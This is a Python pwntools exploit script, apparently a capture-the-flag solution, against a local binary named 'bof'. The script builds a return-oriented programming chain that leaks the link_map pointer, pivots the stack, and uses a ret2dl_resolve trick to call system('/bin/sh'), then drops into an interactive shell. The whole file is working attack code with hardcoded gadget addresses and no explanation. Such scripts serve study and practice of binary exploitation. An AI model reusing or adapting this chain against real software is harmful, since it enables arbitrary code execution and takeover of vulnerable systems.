from pwn import *
from roputils import ROP

def packAll(rop):
    return flat([p64(x) for x in rop])

r = process('./bof')
e = ELF('./bof')
e2 = ROP('./bof')

prdi = 0x0000000000400571# : pop rdi ; ret
prsi = 0x0000000000400573# : pop rsi ; ret
prdx = 0x0000000000400579# : pop rdx ; ret
leave = 0x00000000004005c8# : leave ; ret
ret = 0x0000000000400419# : ret
link_map_got = 0x601008
buf = 0x601800
buf2 = 0x601900

rop = []

# leak link_map
rop += [prdi, 1]
rop += [prsi, link_map_got]
rop += [prdx, 8]
rop += [e.plt['write']]

# prepare rop chain
rop += [prdi, 0]
rop += [prsi, buf]
rop += [prdx, 0x200]
rop += [e.plt['read']]

# stack pivoting
rop += [leave]

# invoke first attack
payload = 'A'*(120-8)+p64(buf-8)+packAll(rop)+'CCCC'
r.send(p64(len(payload)))
r.send(payload)
r.recvuntil('CCCC')
link_map = u64(r.recv(8))
target = link_map + 0x1c8
print 'target:', hex(target)

rop = []

# clear target
rop += [prdi, 0]
rop += [prsi, target]
rop += [prdx, 8]
rop += [e.plt['read']]

# inject /bin/sh and dl_resolve data
data = '/bin/sh\x00'+e2.dl_resolve_data(buf2, 'system')
rop += [prdi, 0]
rop += [prsi, buf2-8]
rop += [prdx, len(data)]
rop += [e.plt['read']]

# prepare register
rop += [prdi, buf2-8]

r.send(packAll(rop)+p64(ret)+e2.dl_resolve_call(buf2))
r.send('\x00'*8)
r.send(data)

r.interactive()
